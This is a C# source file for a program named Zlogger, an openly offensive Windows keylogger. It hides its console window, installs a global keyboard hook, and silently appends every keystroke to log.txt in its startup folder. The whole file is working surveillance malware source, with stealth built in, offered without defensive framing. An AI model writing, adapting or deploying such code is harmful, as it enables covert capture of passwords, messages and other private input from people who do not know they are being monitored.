using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Rodjenihm.Zlogger.WinAPI;

namespace Rodjenihm.Zlogger
{
    class Program
    {
        static void Main(string[] args)
        {
            var handle = Kernel32.GetConsoleWindow();
            User32.ShowWindow(handle, (int)WindowState.SW_HIDE);

            var log = "log.txt";
            using (var keylogger = new Keylogger(log))
            {
                keylogger.KeyboardHookProc = (nCode, wParam, lParam) =>
                {
                    if (nCode >= 0 && wParam == (IntPtr)WindowsMessages.WM_KEYDOWN)
                    {
                        int vkCode = Marshal.ReadInt32(lParam);

                        using (var sw = new StreamWriter(Application.StartupPath + @"\log.txt", true))
                        {
                            sw.Write((Keys)vkCode);
                        }
                    }

                    return keylogger.NextHook(nCode, wParam, lParam);
                };

                keylogger.Run();
                Application.Run();
            }
        }
    }
}
